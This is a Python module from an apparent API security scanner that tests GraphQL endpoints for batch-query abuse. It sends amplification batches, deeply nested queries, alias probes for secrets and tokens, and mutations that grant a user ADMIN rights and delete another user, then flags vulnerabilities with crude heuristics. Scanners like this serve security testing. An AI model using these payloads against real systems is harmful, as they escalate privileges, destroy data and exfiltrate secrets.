#!/usr/bin/env python3
import requests
from typing import Dict, List, Optional
from urllib.parse import urljoin
import json
from RAGScripts.utils.logger import setup_scanner_logger

async def check_graphql_batch(target_url: str, path: str, method: str, initial_response: requests.Response) -> List[Dict]:
    findings = []
    
    try:
        test_url = urljoin(target_url, path)
        
        # Test cases for GraphQL batch query abuse
        test_cases = [
            {
                'name': 'Batch query amplification',
                'queries': [
                    {'query': 'query { user(id: 1) { id name } }'},
                    {'query': 'query { user(id: 2) { id name } }'},
                    {'query': 'query { user(id: 3) { id name } }'},
                    {'query': 'query { user(id: 4) { id name } }'},
                    {'query': 'query { user(id: 5) { id name } }'}
                ] * 20  # Multiply to test batch limits
            },
            {
                'name': 'Mixed operation batch',
                'queries': [
                    {'query': 'query { user(id: 1) { email } }'},
                    {'query': 'mutation { updateUser(id: 1, role: "ADMIN") { success } }'},
                    {'query': 'query { systemConfig { secretKey } }'},
                    {'query': 'mutation { deleteUser(id: 2) { success } }'}
                ]
            },
            {
                'name': 'Nested batch operations',
                'query': '''
                    query {
                        batch1: users(first: 100) {
                            batch2: friends(first: 100) {
                                batch3: posts(first: 100) {
                                    batch4: comments(first: 100) {
                                        id
                                        content
                                    }
                                }
                            }
                        }
                    }
                '''
            },
            {
                'name': 'Batch with aliases',
                'queries': [
                    {'query': '''
                        query {
                            a1: sensitiveData { secret }
                            a2: privateData { key }
                            a3: systemData { config }
                            a4: adminData { access }
                        }
                    '''},
                    {'query': '''
                        query {
                            b1: internalLogs { entries }
                            b2: securityAudit { records }
                            b3: userTokens { values }
                            b4: adminRights { permissions }
                        }
                    '''}
                ]
            }
        ]
        
        for test in test_cases:
            try:
                if 'queries' in test:
                    response = requests.post(
                        test_url,
                        json=test['queries'],
                        headers={'Content-Type': 'application/json'},
                        timeout=10
                    )
                else:
                    response = requests.post(
                        test_url,
                        json={'query': test['query']},
                        headers={'Content-Type': 'application/json'},
                        timeout=10
                    )
                
                if is_batch_vulnerable(response, test):
                    findings.append({
                        "type": "GraphQL Batch Query Abuse",
                        "detail": f"Potential {test['name']} vulnerability",
                        "evidence": {
                            "url": test_url,
                            "query": test.get('query') or test.get('queries'),
                            "status_code": response.status_code,
                            "response": response.text[:200]
                        }
                    })
                    
            except requests.exceptions.RequestException:
                continue
                
    except Exception as e:
        print(f"Error in GraphQL batch check: {str(e)}")
    
    return findings

def is_batch_vulnerable(response: requests.Response, test: Dict) -> bool:
    try:
        response_json = response.json()
    except json.JSONDecodeError:
        return False
    
    response_text = json.dumps(response_json).lower()
    
    # Check for batch amplification success
    if test['name'] == 'Batch query amplification':
        if response.status_code == 200:
            if isinstance(response_json, list) and len(response_json) > 10:
                return True
    
    # Check for mixed operation success
    if test['name'] == 'Mixed operation batch':
        if response.status_code == 200:
            if 'success' in response_text and ('email' in response_text or 'secretkey' in response_text):
                return True
    
    # Check for nested batch success
    if test['name'] == 'Nested batch operations':
        if response.status_code == 200:
            depth = response_text.count('batch')
            if depth >= 3:  # Arbitrary depth threshold
                return True
    
    # Check for aliased batch success
    if test['name'] == 'Batch with aliases':
        sensitive_fields = ['secret', 'key', 'config', 'access', 'entries', 'records', 'tokens']
        if any(field in response_text for field in sensitive_fields):
            return True
    
    # Check for error messages indicating batch issues
    error_indicators = [
        'batch',
        'too many operations',
        'query limit',
        'rate limit',
        'operation limit'
    ]
    
    if any(indicator in response_text for indicator in error_indicators):
        if response.status_code < 400:
            return True
    
    return False

if __name__ == "__main__":
    # For standalone testing
    import asyncio
    async def test():
        result = await check_graphql_batch(
            "http://localhost:5000",
            "/graphql",
            "POST",
            requests.Response()
        )
        print(json.dumps(result, indent=2))
    
    asyncio.run(test())